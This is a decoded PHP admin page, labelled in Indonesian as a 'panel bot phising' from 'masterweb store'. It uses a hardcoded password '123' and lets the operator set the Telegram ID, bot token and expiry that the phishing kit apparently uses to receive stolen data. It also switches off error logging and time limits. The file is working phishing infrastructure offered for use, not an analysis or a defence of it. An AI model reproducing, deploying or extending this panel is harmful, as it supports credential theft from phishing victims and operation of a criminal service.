/* Decoded by unphp.net */

?>b'<?php
session_start();
error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set(\'error_log\',NULL);
@ini_set(\'log_errors\',0);
@ini_set(\'max_execution_time\',0);
@ini_set(\'output_buffering\',0);
@ini_set(\'display_errors\', 0);

/* Configurasi */
  if (isset($_GET[\'logout\'])){
     session_start();
     session_destroy();
     echo \'<script>window.location="?";</script>\';
    }
$aupas      = "123";// pass
$default_action   = \'FilesMan\';
$default_use_ajax   = true;
$default_charset  = \'UTF-8\';
date_default_timezone_set("Asia/Jakarta");

function login(){
?>
  <!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
    <meta name="theme-color" content="#343a40"/>
    <meta name="author" content="Holiq"/>
    <meta name="copyright" content="masterweb store"/>
    <title>login</title>
    <link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/indosec.png"/>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
  </head>
  <body class="bg-dark text-center text-light">
    <div class="container text-center mt-3">
      <h5>masterweb store</h5>
      <a>panel bot phising</a><hr/>
      <p class="mt-3 font-weight-bold"><i class="fa fa-terminal"></i> masukan password panel kamu untuk ganti id sama token bot</p>
      <form method="post">
        <div class="form-group input-group">
          <div class="input-group-prepend">
            <div class="input-group-text"><i class="fa fa-user"></i></div>
          </div>
          <input type="password" name="pass" placeholder="password" class="form-control">
        </div>
        <input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
      </form>
    </div>
    <a href="index.php" class="text-muted fixed-bottom mb-3">Copy right masterweb store</a>
  </body>
</html>
<?php
exit;
}
  if (!isset($_SESSION[\'my_session_key\'])) {
    if (isset($_POST[\'pass\']) && ($_POST[\'pass\'] == $aupas)) {
        $_SESSION[\'my_session_key\'] = true;
        
    } else {
        login();
    }
}
  ?>
 <!DOCTYPE html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel=\'stylesheet\' href=\'https://cdn.rawgit.com/JacobLett/bootstrap4-latest/504729ba/bootstrap-4-latest.min.css\'>
<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
<link rel="stylesheet" href="https://cdn.rawgit.com/JacobLett/bootstrap4-latest/504729ba/bootstrap-4-latest.min.css">
</head>
<body>
<?php 
include \'portalbot.php\';
?>
<form class="container" id="needs-validation" onsubmit="return false">
<div class="add">
<div class="form-group"></div>
<div class="jumbotron p-2">
<nav class="navbar navbar-light bg-dark text-white p-0 pl-2 rounded">
<a class="navbar-brand text-white" href="index.php">PANEL ADMIN BOT TELEGRAM</a>
</nav>
<label class="mt-2" for="id_telegram">ID Telegram</label>
<input type="text" class="form-control" value="<?= $id_telegram; ?>" readonly>
<label class="mt-3" for="id_botTele">Token Bot</label>
<input type="text" class="form-control" value="<?= $id_botTele; ?>" readonly>
<label class="mt-2" for="id_telegram">Kadaluarsa</label>
<input type="date" class="form-control" value="<?= $waktu; ?>" readonly>
<button class="btn btn-primary mt-3" data-toggle="modal" data-target="#gantidata">Ganti Bot</button>

  
<button class="btn btn-warning mt-3" onclick="logout();">Keluar</button>

<script>
function logout() {
window.location.href="?logout"
}
</script>

  
  
</div>
<div class="modal fade" id="gantidata" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title" id="exampleModalLongTitle">Ganti Bot</h5>
</div>
<div class="modal-body">
<div class="form-group">
<label for="exampleInputEmail1">ID TELEGRAM</label>
<input type="text" id="valid" class="form-control" value="<?= $id_telegram; ?>">
<label class="mt-2" for="exampleInputEmail1">Token Bot</label>
<input type="txt" id="valtoken" class="form-control" value="<?= $id_botTele; ?>">
<label class="mt-2" for="exampleInputEmail1">Kadaluarsa</label>
<input type="date" id="waktu" class="form-control" value="<?= $waktu; ?>">
</div>
</div>
<div class="modal-footer d-flex justify-content-start">
<button type="button" id="gantis" class="btn btn-success">Simpan</button>
<button type="button" class="btn btn-danger" data-dismiss="modal">Batal</button>
</div>
</div>
</div>
</div>
</form>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src=\'https://cdn.rawgit.com/JacobLett/bootstrap4-latest/504729ba/bootstrap-4-latest.min.js\'></script><script  src="./script.js"></script>
<script type="text/javascript">
$(document).ready(function(){
$(\'#gantis\').click(function(){
const id_telegram = $(\'#valid\').val();
const id_botTele = $(\'#valtoken\').val();
const waktu = $(\'#waktu\').val();
$(this).prop(\'disabled\', true).css(\'opacity\', \'0.5\').css(\'cursor\', \'not-allowed\');
$.get(\'ganti.php?id_telegram=\' + id_telegram + \'&id_botTele=\' + id_botTele + \'&waktu=\' + waktu, function(done){
if (done == 200) {
setTimeout(() => {
$(\'#gantis\').prop(\'disabled\', false).css(\'opacity\', \'1\').css(\'cursor\', \'pointer\');
location.reload();
}, 2000);
}
});
});
});
</script>
'